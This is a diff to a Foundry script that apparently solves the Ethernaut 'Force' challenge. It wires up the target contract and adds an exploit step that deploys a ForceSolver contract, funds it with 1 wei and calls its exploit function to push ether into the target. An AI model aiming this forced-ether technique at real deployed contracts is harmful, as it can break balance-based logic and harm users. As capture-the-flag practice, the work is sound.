@@ -3,6 +3,7 @@ pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?
 
 import "forge-std/Script.sol";
 import "src/Force/Force.sol";
+import "./ForceSolver.sol";
 
 contract ForceScript is Script {
 
@@ -20,7 +21,7 @@ contract ForceScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = Force(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = Force(0x0000000000000000000000000000000000000000); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -32,7 +33,7 @@ contract ForceScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new Force();
+            target = new Force();
             vm.stopBroadcast();
         }
     }
@@ -44,5 +45,13 @@ contract ForceScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+
+        console.log("[Exploit]");
+        vm.startBroadcast(attacker);
+        ForceSolver solver = new ForceSolver();
+        address(solver).call{value:1}("");
+        solver.exploit(address(target));
+        vm.stopBroadcast();
+        console.log("target balance: %s", address(target).balance);
     }
 }
